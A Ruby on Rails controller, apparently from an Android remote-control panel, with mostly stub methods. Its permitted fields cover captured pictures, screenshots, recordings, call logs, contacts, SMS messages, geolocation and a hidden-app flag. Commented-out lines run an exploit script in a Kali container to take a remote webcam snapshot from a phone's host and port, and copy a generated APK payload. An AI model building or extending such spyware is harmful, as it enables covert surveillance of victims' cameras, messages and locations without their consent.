
class SmartphonesController < InheritedResources::Base
    def front_camera_snap

        #@smartphone = params[:selected_smartphone]

        #if params[:smartphoneId].exists?
        #    puts params[:smartphoneId]

            #u = User.where('id = ?', params[:user_id]).first
        #  end
        #puts u.path
        
        
        # generateApkCommand="docker exec -u 0 kali_container sh -c \"/usr/bin/ruby /root/exploit.rb " \
                            "#{smartphone.host} #{smartphone.port} webcam_snap -q '100' -p '.jpeg' "
        #copyApkCommand="docker cp kali_container:/root/#{apk_payload.name}.apk payloads\\#{apk_payload.name}.apk"


        #newSmartphone=Smartphone.new(:operating_system => 'Unknown',:name => 'Smartphone',:is_rooted => 'False',:is_app_hidden => 'False',:created_at => '2003-05-03 00:00:00',:updated_at => '2003-05-03 00:00:00')
        #newSmartphone.save!

        
    end



    def dropdown_list_smartphones
        render locals: {smartphones: smartphones, smartphone:smartphone}
      end

    def select_smartphone
        redirect_to controller: 'admin/dashboard', action: 'index', selected_smartphone_id: params[:smartphone_id]
    end


    def load
        render
    end

    def install
        path = "installsomething.txt"
        content = "data from the form"
        File.open(path, "w+") do |f|
        f.write(content)
        end
    end

    

  private

    def smartphone_params
      params.require(:smartphone).permit(:operating_system, :name, :pictures, :screenshots, :videos, :recordings, :is_rooted, :call_logs, :contacts, :sms_messages, :geo_locations, :is_app_hidden)
    end





end
